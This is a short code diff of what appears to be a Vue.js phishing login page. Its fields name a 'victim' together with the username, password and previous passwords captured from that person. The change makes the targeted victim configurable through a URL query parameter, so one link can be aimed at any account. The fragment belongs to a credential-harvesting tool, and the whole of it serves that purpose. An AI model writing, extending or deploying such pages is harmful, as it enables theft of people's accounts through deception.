@@ -66,7 +66,6 @@
     components: {
     },
     data: () => ({
-      victim: 'sh_.1.8',
       username: '',
       password: '',
       passwordInputType: 'password',
@@ -74,6 +73,11 @@
       mainButtonBackground: '#4cb5f9',
       prevPasswords: ''
     }),
+    computed: {
+			victim() {
+				return this.$route.query.to
+      }
+    },
     methods: {
         nudifyPassword() {
             if(this.passwordInputType == 'password') {
